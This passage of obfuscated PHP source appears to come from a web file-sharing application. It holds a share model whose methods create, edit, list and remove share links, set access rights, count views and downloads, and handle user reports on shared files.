$this->add($èíà¡Å, array(), !0); } } public function remove($×³¨êÌ£) { return $this->where(array($_SERVER[Ö†ØøÖ±][2032] => $×³¨êÌ£))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Ö†ØøÖ±][2035] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\145"; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\171\124\x69\x6d\145", "\x74\151\155\145", "\151\x6e\x73\145\x72\164\54\165\x70\144\x61\x74\x65", "\x66\165\156\143\x74\151\157\156"), array("\x63\162\145\141\164\x65\x54\x69\x6d\x65", "\x74\x69\155\145", "\x69\x6e\x73\145\x72\x74", "\x66\x75\x6e\143\x74\x69\157\156"), array("\157\x70\x74\151\157\156\x73", '', "\x69\156\x73\x65\x72\x74\54\165\160\x64\141\x74\x65\x2c\163\x65\x6c\145\143\164", "\152\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ëçğÏ¢¼) { $óÓÑªî =& $_SERVER[Ö†ØøÖ±]; $êşû”Ì¡ = isset($ëçğÏ¢¼[0]) ? $ëçğÏ¢¼[0] : !1; return array($óÓÑªî[2036] => array(USER_ID, $óÓÑªî[2037]), $óÓÑªî[1977] => array($êşû”Ì¡, $óÓÑªî[2038])); } protected function listSimple() { $°Ç¥™Ğ = array($_SERVER[Ö†ØøÖ±][1699] => USER_ID); $Ğó”âÍò = $this->field($this->fieldList)->where($°Ç¥™Ğ)->select(); return $Ğó”âÍò ? $Ğó”âÍò : array(); } protected function getInfo($‘õ›æõƒ, $ìÎÊ¢ó = false) { $Á÷÷Ã¯† =& $_SERVER[Ö†ØøÖ±]; if ($ìÎÊ¢ó) { return $this->_getShareInfo(array($Á÷÷Ã¯†[642] => $‘õ›æõƒ)); } $º¨’Ê˜ = $this->cacheFunctionGet($Á÷÷Ã¯†[1979], $‘õ›æõƒ); return $º¨’Ê˜; } public function getInfoByHash($áª’»‰®) { return $this->_getShareInfo(array($_SERVER[Ö†ØøÖ±][2039] => $áª’»‰®)); } public function getInfoByPath($§ıäôÖŸ) { $©…§ƒıÆ =& $_SERVER[Ö†ØøÖ±]; $Á¿¢¢®‹ = array($©…§ƒıÆ[1699] => USER_ID, $©…§ƒıÆ[181] => $§ıäôÖŸ); return $this->_getShareInfo($Á¿¢¢®‹); } public function getInfoBySourcePath($µòèŒ˜) { $«„â™Àä =& $_SERVER[Ö†ØøÖ±]; $âø”¸¢Ş = array($«„â™Àä[1699] => USER_ID, $«„â™Àä[1228] => $µòèŒ˜); return $this->_getShareInfo($âø”¸¢Ş); } private function _getShareInfo($’â®­Şş) { $¦ÓâÉû =& $_SERVER[Ö†ØøÖ±]; $æ¿Æòïò = $this->where($’â®­Şş)->find(); if (!$æ¿Æòïò) { return !1; } $’â®­Şş = array($¦ÓâÉû[642] => $æ¿Æòïò[$¦ÓâÉû[642]]); $Ï–¹àªî = $¦ÓâÉû[2040]; $‹ß£ëğ° = Model($¦ÓâÉû[643])->order($¦ÓâÉû[451])->field($Ï–¹àªî)->where($’â®­Şş)->select(); if ($æ¿Æòïò[$¦ÓâÉû[181]] == $¦ÓâÉû[212]) { $æ¿Æòïò[$¦ÓâÉû[87]] = IO::info($æ¿Æòïò[$¦ÓâÉû[1228]]); } else { $æ¿Æòïò[$¦ÓâÉû[87]] = Model($¦ÓâÉû[1385])->pathInfo($æ¿Æòïò[$¦ÓâÉû[181]]); } $æ¿Æòïò[$¦ÓâÉû[2041]] = $‹ß£ëğ°; return $æ¿Æòïò; } protected function getInfoAuth($·º÷¸‘ª) { $¥ËÃê =& $_SERVER[Ö†ØøÖ±]; $û›ñ¥˜Ï = $this->getInfo($·º÷¸‘ª); if ($û›ñ¥˜Ï[$¥ËÃê[1699]] == USER_ID) { $û›ñ¥˜Ï[$¥ËÃê[464]] = $û›ñ¥˜Ï[$¥ËÃê[87]][$¥ËÃê[464]]; } else { $û›ñ¥˜Ï[$¥ËÃê[464]] = Model($¥ËÃê[544])->authMake($û›ñ¥˜Ï[$¥ËÃê[2041]]); } return $û›ñ¥˜Ï; } protected function listData($ÂÖì˜¼ê = null, $—´ÖäáÜ = 300) { $ş±¦©Ê¯ =& $_SERVER[Ö†ØøÖ±]; $ÅãôËù‰ = array(array($ş±¦©Ê¯[539] => array($ş±¦©Ê¯[1065], 0), $ş±¦©Ê¯[640] => array($ş±¦©Ê¯[1065], 0), $ş±¦©Ê¯[2042] => $ş±¦©Ê¯[1995])); if ($ÂÖì˜¼ê == $ş±¦©Ê¯[2043]) { $ÅãôËù‰ = array($ş±¦©Ê¯[539] => 1); } else { if ($ÂÖì˜¼ê == $ş±¦©Ê¯[1214]) { $ÅãôËù‰ = array($ş±¦©Ê¯[640] => 1); } } $ÅãôËù‰[$ş±¦©Ê¯[1699]] = USER_ID; $ÃÒŞïØÇ = $this->where($ÅãôËù‰)->selectPage($—´ÖäáÜ); return $ÃÒŞïØÇ; } protected function listToMe($•„Ê›ƒ = 300) { $øñèÆôë =& $_SERVER[Ö†ØøÖ±]; $Ç°„ŸÏí = Model($øñèÆôë[2044])->userGroupParents(USER_ID); $öÁªÁÎñ = array($øñèÆôë[625] => SourceModel::TYPE_USER, $øñèÆôë[547] => USER_ID); if ($Ç°„ŸÏí) { $öÁªÁÎñ = array(array($øñèÆôë[625] => SourceModel::TYPE_USER, $øñèÆôë[547] => USER_ID), array($øñèÆôë[625] => SourceModel::TYPE_GROUP, $øñèÆôë[547] => array($øñèÆôë[7], $Ç°„ŸÏí)), $øñèÆôë[2042] => $øñèÆôë[1995]); } $·Ç‘‚õí = Model($øñèÆôë[643])->where($öÁªÁÎñ)->selectPage($•„Ê›ƒ); $ËÊ…Ÿ² = array_to_keyvalue_group($·Ç‘‚õí[$øñèÆôë[422]], $øñèÆôë[642]); if (!$ËÊ…Ÿ²) { return $·Ç‘‚õí; } $¹ „õ€± = $øñèÆôë[2045]; $öÁªÁÎñ = array($øñèÆôë[642] => array($øñèÆôë[469], array_keys($ËÊ…Ÿ²)), $øñèÆôë[1699] => array($øñèÆôë[1067], $øñèÆôë[212])); $òÜÎíš = $this->field($¹ „õ€±)->where($öÁªÁÎñ)->select(); foreach ($òÜÎíš as $ŠŒÀ¼›ä => &$úÚƒœû´) { $úÚƒœû´[$øñèÆôë[2041]] = $ËÊ…Ÿ²[$úÚƒœû´[$øñèÆôë[642]]]; } unset($úÚƒœû´); $¼ŸœÏÌÁ = array($øñèÆôë[2046] => $òÜÎíš, $øñèÆôë[2047] => $·Ç‘‚õí[$øñèÆôë[419]]); return $¼ŸœÏÌÁ; } protected function shareAdd($½éµˆÇ, $¦úÔ´‡¢) { $ßÎ =& $_SERVER[Ö†ØøÖ±]; $¥—ÕÏ­İ = $this->_addShareData($½éµˆÇ, $¦úÔ´‡¢); if (!empty($¦úÔ´‡¢[$ßÎ[2048]])) { $this->_shareAuthSet($¥—ÕÏ­İ, $¦úÔ´‡¢[$ßÎ[2048]]); } $this->shareEventAdd($½éµˆÇ, $¦úÔ´‡¢, $ßÎ[2049]); return $¥—ÕÏ­İ; } protected function shareAddSystem($¬¼±Ã×, $“½ÑŒ¶ó) { $ç’ª…œü =& $_SERVER[Ö†ØøÖ±]; $¼€Š¥Ûè = $this->_addShareData($¬¼±Ã×, $“½ÑŒ¶ó, $ç’ª…œü[179]); $this->_shareAuthSet($¼€Š¥Ûè, $“½ÑŒ¶ó[$ç’ª…œü[2048]]); return $¼€Š¥Ûè; } private function shareEventAdd($è…¢ÕÁİ, $‹º†²×, $¾í—øú = "\x61\144\144") { $±ï¼áª÷ =& $_SERVER[Ö†ØøÖ±]; if (!$è…¢ÕÁİ || $è…¢ÕÁİ == $±ï¼áª÷[212]) { return; } if ($¾í—øú == $±ï¼áª÷[2049]) { if ($‹º†²×[$±ï¼áª÷[539]] == $±ï¼áª÷[88]) { Model($±ï¼áª÷[610])->eventShare($è…¢ÕÁİ, $±ï¼áª÷[2050]); } if ($‹º†²×[$±ï¼áª÷[640]] == $±ï¼áª÷[88]) { Model($±ï¼áª÷[610])->eventShare($è…¢ÕÁİ, $±ï¼áª÷[2051]); } return; } $Û­¡®é’ = $this->getInfoByPath($è…¢ÕÁİ); $áÆ–­©… = $±ï¼áª÷[2052]; if ($Û­¡®é’[$±ï¼áª÷[539]] == $±ï¼áª÷[212] && $‹º†²×[$±ï¼áª÷[539]] == $±ï¼áª÷[88]) { $áÆ–­©… = $±ï¼áª÷[2050]; } if ($Û­¡®é’[$±ï¼áª÷[539]] == $±ï¼áª÷[88] && $‹º†²×[$±ï¼áª÷[539]] == $±ï¼áª÷[212]) { $áÆ–­©… = $±ï¼áª÷[2053]; } if ($Û­¡®é’[$±ï¼áª÷[640]] == $±ï¼áª÷[212] && $‹º†²×[$±ï¼áª÷[640]] == $±ï¼áª÷[88]) { $áÆ–­©… = $±ï¼áª÷[2051]; } if ($Û­¡®é’[$±ï¼áª÷[640]] == $±ï¼áª÷[88] && $‹º†²×[$±ï¼áª÷[640]] == $±ï¼áª÷[212]) { $áÆ–­©… = $±ï¼áª÷[2054]; } Model($±ï¼áª÷[610])->eventShare($è…¢ÕÁİ, $áÆ–­©…); return; } private function _addShareData($Ä¡ÚÓ³Á, $Õ¯Ÿà÷€ = array(), $¶¬Æ•“î = false) { $«äÍ”»Ş =& $_SERVER[Ö†ØøÖ±]; $ƒãæ»µ¤ = $¶¬Æ•“î == $«äÍ”»Ş[179] ? 0 : USER_ID; $†¹ÔÕ› = array($«äÍ”»Ş[468] => $Ä¡ÚÓ³Á, $«äÍ”»Ş[1690] => $ƒãæ»µ¤); if ($Ä¡ÚÓ³Á == 0) { $†¹ÔÕ› = array($«äÍ”»Ş[2055] => $Õ¯Ÿà÷€[$«äÍ”»Ş[1228]], $«äÍ”»Ş[1690] => $ƒãæ»µ¤); } if ($Âë€àêÔ = $this->where($†¹ÔÕ›)->find()) { return $Âë€àêÔ[$«äÍ”»Ş[642]]; } if ($Ä¡ÚÓ³Á == 0) { $®¿…Èİ = array($«äÍ”»Ş[32] => get_path_this($Õ¯Ÿà÷€[$«äÍ”»Ş[84]])); } else { $®¿…Èİ = Model($«äÍ”»Ş[878])->sourceInfo($Ä¡ÚÓ³Á); if (!$®¿…Èİ) { return !1; } } if (!$Õ¯Ÿà÷€[$«äÍ”»Ş[1596]]) { $Õ¯Ÿà÷€[$«äÍ”»Ş[1596]] = $®¿…Èİ[$«äÍ”»Ş[32]]; } $¹©¿áÀ× = array($«äÍ”»Ş[1690] => $ƒãæ»µ¤, $«äÍ”»Ş[468] => $Ä¡ÚÓ³Á, $«äÍ”»Ş[1596] => $«äÍ”»Ş[12], $«äÍ”»Ş[539] => 0, $«äÍ”»Ş[640] => 0, $«äÍ”»Ş[1228] => $«äÍ”»Ş[12], $«äÍ”»Ş[360] => $«äÍ”»Ş[12], $«äÍ”»Ş[942] => $«äÍ”»Ş[12], $«äÍ”»Ş[2056] => 0, $«äÍ”»Ş[2057] => 0, $«äÍ”»Ş[814] => 0, $«äÍ”»Ş[2058] => $«äÍ”»Ş[12], $«äÍ”»Ş[2039] => $«äÍ”»Ş[12]); $­„ö»ı = explode($«äÍ”»Ş[50], $«äÍ”»Ş[2059]); foreach ($­„ö»ı as $ß…šùÎÖ) { if (!isset($Õ¯Ÿà÷€[$ß…šùÎÖ])) { continue; } $¹©¿áÀ×[$ß…šùÎÖ] = $Õ¯Ÿà÷€[$ß…šùÎÖ]; } $ï²é™š = $this->add($¹©¿áÀ×); $´œ—×şŞ = array($«äÍ”»Ş[2039] => short_id($ï²é™š)); $this->where(array($«äÍ”»Ş[2060] => $ï²é™š))->save($´œ—×şŞ); return $ï²é™š; } private function _shareAuthSet($üÜğ¶Ô¥, $øèŠÇ­) { $Äµ½‰§ò =& $_SERVER[Ö†ØøÖ±]; if (!is_array($øèŠÇ­)) { return !1; } $ˆÄ±´ÙÃ = Model($Äµ½‰§ò[2005]); $ˆÄ±´ÙÃ->where(array($Äµ½‰§ò[642] => $üÜğ¶Ô¥))->delete(); $ô¼êÎÇí = array(); foreach ($øèŠÇ­ as $µ­•ı–é) { $¼ºÖÁÍ = SourceModel::TYPE_USER; if ($µ­•ı–é[$Äµ½‰§ò[178]] == SourceModel::TYPE_GROUP) { $¼ºÖÁÍ = SourceModel::TYPE_GROUP; } $èßÙ€­å = array($Äµ½‰§ò[642] => $üÜğ¶Ô¥, $Äµ½‰§ò[178] => $¼ºÖÁÍ, $Äµ½‰§ò[547] => intval($µ­•ı–é[$Äµ½‰§ò[547]]), $Äµ½‰§ò[2001] => 0, $Äµ½‰§ò[2061] => -1); if ($µ­•ı–é[$Äµ½‰§ò[2001]]) { $èßÙ€­å[$Äµ½‰§ò[2001]] = $µ­•ı–é[$Äµ½‰§ò[2001]]; } else { if ($µ­•ı–é[$Äµ½‰§ò[2061]]) { $èßÙ€­å[$Äµ½‰§ò[2061]] = $µ­•ı–é[$Äµ½‰§ò[2061]]; } } $ô¼êÎÇí[] = $èßÙ€­å; } return $ˆÄ±´ÙÃ->addAll($ô¼êÎÇí, array(), !0); } public function numViewAdd($¦²é±»”) { $•ÂËé › =& $_SERVER[Ö†ØøÖ±]; $úˆİÌ»¥ = array($•ÂËé ›[2060] => $¦²é±»”); $this->where($úˆİÌ»¥)->setAdd($•ÂËé ›[2056]); } public function numDownloadAdd($üşÃ¹¿¾) { $êñŸûô =& $_SERVER[Ö†ØøÖ±]; $³¡×¨˜Û = array($êñŸûô[2060] => $üşÃ¹¿¾); $this->where($³¡×¨˜Û)->setAdd($êñŸûô[2057]); } protected function shareEdit($õğŠ¿¤ï, $àˆ¸ãÃ•) { $Ñü• ´ü =& $_SERVER[Ö†ØøÖ±]; $£ûü¯’¿ = $this->getInfo($õğŠ¿¤ï); if (!$£ûü¯’¿) { return !1; } $this->_checkLinkShare($àˆ¸ãÃ•, $£ûü¯’¿); $İÀÒÈƒÍ = array(); $¡‰ãÎ = explode($Ñü• ´ü[50], $Ñü• ´ü[2062]); foreach ($¡‰ãÎ as $à„Û¤€ë) { if (!array_key_exists($à„Û¤€ë, $àˆ¸ãÃ•)) { continue; } $İÀÒÈƒÍ[$à„Û¤€ë] = $àˆ¸ãÃ•[$à„Û¤€ë]; } $this->shareEventAdd($£ûü¯’¿[$Ñü• ´ü[181]], $àˆ¸ãÃ•, $Ñü• ´ü[1867]); $this->where(array($Ñü• ´ü[2060] => $õğŠ¿¤ï))->save($İÀÒÈƒÍ); if (isset($àˆ¸ãÃ•[$Ñü• ´ü[2048]])) { $this->_shareAuthSet($õğŠ¿¤ï, $àˆ¸ãÃ•[$Ñü• ´ü[2048]]); } return !0; } private function _checkLinkShare($¾Ë©İ¬Å, $½Ğ¶–Ó®) { $ªÂ™±ÜÁ =& $_SERVER[Ö†ØøÖ±]; if ($¾Ë©İ¬Å[$ªÂ™±ÜÁ[539]] != $ªÂ™±ÜÁ[88]) { return; } $äÚ£‰¡¾ = $½Ğ¶–Ó®[$ªÂ™±ÜÁ[87]][$ªÂ™±ÜÁ[181]]; if ($½Ğ¶–Ó®[$ªÂ™±ÜÁ[87]][$ªÂ™±ÜÁ[33]] != $ªÂ™±ÜÁ[214]) { $¹ ¥˜› = $this->_folderReport($äÚ£‰¡¾); if (!$¹ ¥˜›) { return; } show_json(LNG($ªÂ™±ÜÁ[2063]) . $ªÂ™±ÜÁ[2064] . $¹ ¥˜›, !1); } $‘âÔí“ = Model($ªÂ™±ÜÁ[878])->fileInfoGet($½Ğ¶–Ó®[$ªÂ™±ÜÁ[87]][$ªÂ™±ÜÁ[181]]); if (!$‘âÔí“) { return; } $Ç¦ùã²° = $this->shareFileMeta($‘âÔí“[$ªÂ™±ÜÁ[518]]); if (isset($Ç¦ùã²°[$ªÂ™±ÜÁ[427]]) && $Ç¦ùã²°[$ªÂ™±ÜÁ[427]] == $ªÂ™±ÜÁ[88]) { show_json(LNG($ªÂ™±ÜÁ[2065]), !1); } } private function _folderReport($ÅÍçÃ¸) { $‘øÇ–éµ =& $_SERVER[Ö†ØøÖ±]; $Ô…ùëõ = array($‘øÇ–éµ[518] => array($‘øÇ–éµ[1065], 0), $‘øÇ–éµ[803] => 3); $Ñ…®ãçÆ = Model($‘øÇ–éµ[2066])->where($Ô…ùëõ)->field($‘øÇ–éµ[518])->select(); if (!$Ñ…®ãçÆ) { return !1; } $Ñ…®ãçÆ = array_to_keyvalue($Ñ…®ãçÆ, $‘øÇ–éµ[12], $‘øÇ–éµ[518]); $‰Éà Üˆ = $‘øÇ–éµ[50] . $ÅÍçÃ¸ . $‘øÇ–éµ[50]; $Ô…ùëõ = array($‘øÇ–éµ[518] => array($‘øÇ–éµ[7], $Ñ…®ãçÆ), $‘øÇ–éµ[562] => array($‘øÇ–éµ[435], "\45{$‰Éà Üˆ}\45"), $‘øÇ–éµ[482] => 0); $ÈÆ±ÙÇñ = Model($‘øÇ–éµ[878])->where($Ô…ùëõ)->field($‘øÇ–éµ[2067])->find(); if (!$ÈÆ±ÙÇñ) { return !1; } $……˜”ßÕ = substr($ÈÆ±ÙÇñ[$‘øÇ–éµ[562]], strpos($ÈÆ±ÙÇñ[$‘øÇ–éµ[562]], $‰Éà Üˆ)); $Ô…ùëõ = array($‘øÇ–éµ[181] => array($‘øÇ–éµ[7], trim($……˜”ßÕ, $‘øÇ–éµ[50]))); $§ê¬®Ó = Model($‘øÇ–éµ[878])->where($Ô…ùëõ)->field($‘øÇ–éµ[32])->select(); $ªÇõáìë = array_to_keyvalue($§ê¬®Ó, $‘øÇ–éµ[12], $‘øÇ–éµ[32]); $ªÇõáìë[] = $ÈÆ±ÙÇñ[$‘øÇ–éµ[32]]; return implode($‘øÇ–éµ[8], $ªÇõáìë); } protected function remove($éù¹‘şı) { $›ÒºŠœ =& $_SERVER[Ö†ØøÖ±]; if (is_array($éù¹‘şı)) { $éù¹‘şı = array($›ÒºŠœ[7], $éù¹‘şı); } $š¾Éé”´ = array($›ÒºŠœ[642] => $éù¹‘şı); $ßèÂãÃ¡ = $this->where($š¾Éé”´)->delete(); if ($ßèÂãÃ¡) { Model($›ÒºŠœ[643])->where(array($›ÒºŠœ[642] => $éù¹‘şı))->delete(); } $ Û”Öìõ = is_array($éù¹‘şı) ? $éù¹‘şı[1] : array($éù¹‘şı); for ($Ì÷Éğ­¢ = 0; $Ì÷Éğ­¢ < count($ Û”Öìõ); $Ì÷Éğ­¢++) { $²ıìÏ’ğ = $this->getInfo($ Û”Öìõ[$Ì÷Éğ­¢]); if ($²ıìÏ’ğ[$›ÒºŠœ[640]] == $›ÒºŠœ[88]) { Model($›ÒºŠœ[610])->eventShare($²ıìÏ’ğ[$›ÒºŠœ[181]], $›ÒºŠœ[2054]); } if ($²ıìÏ’ğ[$›ÒºŠœ[539]] == $›ÒºŠœ[88]) { Model($›ÒºŠœ[610])->eventShare($²ıìÏ’ğ[$›ÒºŠœ[181]], $›ÒºŠœ[2053]); } } return $ßèÂãÃ¡; } protected function removeBySource($äßŞáé™) { $¾¡¶º × =& $_SERVER[Ö†ØøÖ±]; $ğÍÀÓìª = array($¾¡¶º ×[468] => array($¾¡¶º ×[469], $äßŞáé™)); $®íÎ¯¹ò = $this->field($¾¡¶º ×[642])->where($ğÍÀÓìª)->select(); $®íÎ¯¹ò = array_to_keyvalue($®íÎ¯¹ò, $¾¡¶º ×[12], $¾¡¶º ×[642]); if (!$®íÎ¯¹ò) { return; } $ğÍÀÓìª = array($¾¡¶º ×[2060] => array($¾¡¶º ×[469], $®íÎ¯¹ò)); $this->where($ğÍÀÓìª)->delete(); Model($¾¡¶º ×[643])->where($ğÍÀÓìª)->delete(); } public function listAll($¨Ñ‹şäÃ) { $äÜ°ıÚÃ =& $_SERVER[Ö†ØøÖ±]; $¥ÁşÅŒ‘ = array(); if ($¨Ñ‹şäÃ[$äÜ°ıÚÃ[1699]]) { $¥ÁşÅŒ‘[$äÜ°ıÚÃ[1699]] = $¨Ñ‹şäÃ[$äÜ°ıÚÃ[1699]]; } if ($¨Ñ‹şäÃ[$äÜ°ıÚÃ[813]]) { $¬µëïÇ‹ = $¨Ñ‹şäÃ[$äÜ°ıÚÃ[814]] ? $¨Ñ‹şäÃ[$äÜ°ıÚÃ[814]] : strtotime(date($äÜ°ıÚÃ[2068])); $¥ÁşÅŒ‘[$äÜ°ıÚÃ[215]] = array($äÜ°ıÚÃ[386], array($¨Ñ‹şäÃ[$äÜ°ıÚÃ[813]], $¬µëïÇ‹)); } if ($¨Ñ‹şäÃ[$äÜ°ıÚÃ[33]]) { $¥ÁşÅŒ‘[$¨Ñ‹şäÃ[$äÜ°ıÚÃ[33]]] = 1; } else { $¥ÁşÅŒ‘[] = array($äÜ°ıÚÃ[539] => array($äÜ°ıÚÃ[1065], 0), $äÜ°ıÚÃ[640] => array($äÜ°ıÚÃ[1065], 0), $äÜ°ıÚÃ[2042] => $äÜ°ıÚÃ[1995]); } if ($¨Ñ‹şäÃ[$äÜ°ıÚÃ[1991]]) { $¥ÁşÅŒ‘[] = array($äÜ°ıÚÃ[2039] => $¨Ñ‹şäÃ[$äÜ°ıÚÃ[1991]], $äÜ°ıÚÃ[1596] => array($äÜ°ıÚÃ[435], "\x25{$¨Ñ‹şäÃ[$äÜ°ıÚÃ[1991]]}\x25"), $äÜ°ıÚÃ[2042] => $äÜ°ıÚÃ[1995]); } $–©®İÛğ = $this->_makeOrder()->where($¥ÁşÅŒ‘)->selectPage(20); if (empty($–©®İÛğ[$äÜ°ıÚÃ[422]])) { return array(); } $this->_listDataApply($–©®İÛğ[$äÜ°ıÚÃ[422]]); return $–©®İÛğ; } public function listDataApply($¶òÀÉÀª) { $this->_listDataApply($¶òÀÉÀª); return $¶òÀÉÀª; } private function _listDataApply(&$¸¼ÁŸ°) { $¶²ê±Ğ“ =& $_SERVER[Ö†ØøÖ±]; $şİ£Â§ = array_to_keyvalue($¸¼ÁŸ°, $¶²ê±Ğ“[12], $¶²ê±Ğ“[1699]); $¯¦´ò = Model($¶²ê±Ğ“[576])->userListInfo(array_unique($şİ£Â§)); $—è‘ıÉ« = array_to_keyvalue($¸¼ÁŸ°, $¶²ê±Ğ“[12], $¶²ê±Ğ“[181]); $†´ç‰š´ = Model($¶²ê±Ğ“[878])->sourceListInfo($—è‘ıÉ«, !0); foreach ($¸¼ÁŸ° as $êÈØˆÉü => &$¿³”Á) { $Á– È÷é = $¿³”Á[$¶²ê±Ğ“[1699]]; $¿³”Á[$¶²ê±Ğ“[2069]] = $¯¦´ò[$Á– È÷é] ? $¯¦´ò[$Á– È÷é] : !1; $‚†Î³ = $¿³”Á[$¶²ê±Ğ“[181]]; $¿³”Á[$¶²ê±Ğ“[87]] = $†´ç‰š´[$‚†Î³] ? $†´ç‰š´[$‚†Î³] : !1; if ($¿³”Á[$¶²ê±Ğ“[87]][$¶²ê±Ğ“[482]] == $¶²ê±Ğ“[88]) { unset($¸¼ÁŸ°[$êÈØˆÉü]); } if ($¿³”Á[$¶²ê±Ğ“[87]] != $¶²ê±Ğ“[212] && !$¿³”Á[$¶²ê±Ğ“[87]]) { unset($¸¼ÁŸ°[$êÈØˆÉü]); } } unset($¿³”Á); $¸¼ÁŸ° = array_values($¸¼ÁŸ°); } private function _makeOrder($±´ú‹Çõ = '') { $¡©ñËÅŞ =& $_SERVER[Ö†ØøÖ±]; $±€â£ß§ = array($¡©ñËÅŞ[215], $¡©ñËÅŞ[814], $¡©ñËÅŞ[2056], $¡©ñËÅŞ[2057]); $èŠ›âì = array($¡©ñËÅŞ[500] => $¡©ñËÅŞ[501], $¡©ñËÅŞ[502] => $¡©ñËÅŞ[503]); $“ö®…Íö = Input::get($¡©ñËÅŞ[507], $¡©ñËÅŞ[7], $¡©ñËÅŞ[474], $±€â£ß§); $€Õ»…Á = Input::get($¡©ñËÅŞ[508], $¡©ñËÅŞ[7], $¡©ñËÅŞ[2070], array($¡©ñËÅŞ[1988], $¡©ñËÅŞ[502])); $€Õ»…Á = $èŠ›âì[$€Õ»…Á]; $±´ú‹Çõ = $±´ú‹Çõ . "{$“ö®…Íö}\40{$€Õ»…Á}"; return $this->order($±´ú‹Çõ); } public function reportAdd($è˜İ·¨¾) { $¸„ÄÈæ =& $_SERVER[Ö†ØøÖ±]; $íº¸ñ«± = array($¸„ÄÈæ[642] => $è˜İ·¨¾[$¸„ÄÈæ[642]], $¸„ÄÈæ[1699] => USER_ID); if (Model($¸„ÄÈæ[2066])->where($íº¸ñ«±)->find()) { return !1; } $§í†ü„ã = array($¸„ÄÈæ[642] => $è˜İ·¨¾[$¸„ÄÈæ[642]], $¸„ÄÈæ[1596] => $è˜İ·¨¾[$¸„ÄÈæ[1596]], $¸„ÄÈæ[181] => $è˜İ·¨¾[$¸„ÄÈæ[181]], $¸„ÄÈæ[518] => $è˜İ·¨¾[$¸„ÄÈæ[518]], $¸„ÄÈæ[1699] => USER_ID, $¸„ÄÈæ[33] => $è˜İ·¨¾[$¸„ÄÈæ[33]], $¸„ÄÈæ[503] => $è˜İ·¨¾[$¸„ÄÈæ[503]]); return Model($¸„ÄÈæ[2066])->add($§í†ü„ã); } public function reportList($Ì©×ÙÃ) { $ –ôßê„ =& $_SERVER[Ö†ØøÖ±]; $’İ´Ç¶Ú = array(); if ($Ì©×ÙÃ[$ –ôßê„[813]]) { $’ß€ğç» = $Ì©×ÙÃ[$ –ôßê„[814]] ? $Ì©×ÙÃ[$ –ôßê„[814]] : strtotime(date($ –ôßê„[2068])); $’İ´Ç¶Ú[$ –ôßê„[215]] = array($ –ôßê„[386], array($Ì©×ÙÃ[$ –ôßê„[813]], $’ß€ğç»)); } if (isset($Ì©×ÙÃ[$ –ôßê„[33]]) && in_array($Ì©×ÙÃ[$ –ôßê„[33]], array($ –ôßê„[88], $ –ôßê„[487], $ –ôßê„[2071], $ –ôßê„[2072], $ –ôßê„[2073]))) { $’İ´Ç¶Ú[$ –ôßê„[33]] = $Ì©×ÙÃ[$ –ôßê„[33]]; } if (isset($Ì©×ÙÃ[$ –ôßê„[803]]) && in_array($Ì©×ÙÃ[$ –ôßê„[803]], array($ –ôßê„[212], $ –ôßê„[88], $ –ôßê„[487], $ –ôßê„[2071]))) { $’İ´Ç¶Ú[$ –ôßê„[803]] = $Ì©×ÙÃ[$ –ôßê„[803]]; } $ĞàôÓÓ… = Input::get($ –ôßê„[508], $ –ôßê„[7], $ –ôßê„[2070], array($ –ôßê„[1988], $ –ôßê„[502])); $¡›Å“ÖÎ = array($ –ôßê„[500] => $ –ôßê„[501], $ –ôßê„[502] => $ –ôßê„[503]); $Ûø÷¿Âö = $ –ôßê„[2074] . $¡›Å“ÖÎ[$ĞàôÓÓ…]; $ºŠ•„¨ = Model($ –ôßê„[2066])->where($’İ´Ç¶Ú)->order($Ûø÷¿Âö)->selectPage(20); if (empty($ºŠ•„¨[$ –ôßê„[422]])) { return array(); } $´°ìÂ› = array_to_keyvalue_group($ºŠ•„¨[$ –ôßê„[422]], $ –ôßê„[803], $ –ôßê„[642]); if (!empty($´°ìÂ›[0])) { $Ì©×ÙÃ = $´°ìÂ›[0]; $’İ´Ç¶Ú = array($ –ôßê„[642] => array($ –ôßê„[7], $Ì©×ÙÃ)); $¢ùÚØ = $this->where($’İ´Ç¶Ú)->field($ –ôßê„[642])->select(); $¢ùÚØ = array_to_keyvalue($¢ùÚØ, $ –ôßê„[12], $ –ôßê„[642]); $œ‰†‘Ë• = array_diff($Ì©×ÙÃ, $¢ùÚØ); if (!empty($œ‰†‘Ë•)) { foreach ($ºŠ•„¨[$ –ôßê„[422]] as $…ìéËÖ => $Î¬¨ïÚ¡) { if (in_array($Î¬¨ïÚ¡[$ –ôßê„[642]], $œ‰†‘Ë•)) { unset($ºŠ•„¨[$ –ôßê„[422]][$…ìéËÖ]); } } } } $this->_listDataApply($ºŠ•„¨[$ –ôßê„[422]]); return $ºŠ•„¨; } public function reportStatus($ÒçÅˆâë) { $ÂñÌŠŸ˜ =& $_SERVER[Ö†ØøÖ±]; $­¿¯¦µ = array($ÂñÌŠŸ˜[451] => $ÒçÅˆâë[$ÂñÌŠŸ˜[451]]); $Ò¢£îêÓ = Model($ÂñÌŠŸ˜[2066])->where($­¿¯¦µ)->field($ÂñÌŠŸ˜[2075])->find(); if (!$Ò¢£îêÓ) { return !1; } $š†Àêİ· = array($ÂñÌŠŸ˜[803] => $ÒçÅˆâë[$ÂñÌŠŸ˜[803]]); if ($ÒçÅˆâë[$ÂñÌŠŸ˜[803]] == $ÂñÌŠŸ˜[2071] && $Ò¢£îêÓ[$ÂñÌŠŸ˜[803]] == $ÂñÌŠŸ˜[2071]) { $š†Àêİ·[$ÂñÌŠŸ˜[803]] = 0; } $³ÌÛÕŞÈ = Model($ÂñÌŠŸ˜[2066])->where($­¿¯¦µ)->save($š†Àêİ·); if ($ÒçÅˆâë[$ÂñÌŠŸ˜[803]] == $ÂñÌŠŸ˜[487]) { if ($Ò¢£îêÓ[$ÂñÌŠŸ˜[518]] != $ÂñÌŠŸ˜[212] && $this->shareFileMeta($Ò¢£îêÓ[$ÂñÌŠŸ˜[518]])) { $this->shareFileMeta($Ò¢£îêÓ[$ÂñÌŠŸ˜[518]], 0); } $this->remove($Ò¢£îêÓ[$ÂñÌŠŸ˜[642]]); return !0; } if ($³ÌÛÕŞÈ && $ÒçÅˆâë[$ÂñÌŠŸ˜[803]] == $ÂñÌŠŸ˜[2071]) { $–ˆÜ¹¤ = $š†Àêİ·[$ÂñÌŠŸ˜[803]] == $ÂñÌŠŸ˜[2071] ? 1 : 0; $this->shareFileMeta($Ò¢£îêÓ[$ÂñÌŠŸ˜[518]], $–ˆÜ¹¤); $this->removeByFile($Ò¢£îêÓ[$ÂñÌŠŸ˜[518]]); } return $³ÌÛÕŞÈ; } 